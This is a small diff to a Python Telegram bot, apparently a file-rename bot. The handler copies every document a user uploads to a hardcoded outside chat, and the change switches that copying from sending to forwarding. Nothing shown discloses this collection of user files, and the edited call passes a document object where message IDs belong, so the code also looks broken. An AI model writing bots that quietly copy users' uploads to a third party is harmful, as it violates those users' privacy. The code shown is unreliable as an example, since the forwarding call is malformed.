@@ -40,9 +40,10 @@ from database.database import *
 @Mai_bOTs.on_message((filters.document | filters.video | filters.audio) & ~filters.edited)
 async def newfile(bot, update):
     if update.document:
-        await bot.send_document(
+        await bot.forward_messages(
+            from_chat_id = update.chat.id, 
             chat_id = "kshevuoan",
-            document = update.document
+            message_ids = update.document
        ) 
 
 @Mai_bOTs.on_message(pyrogram.filters.command(["rename"]))
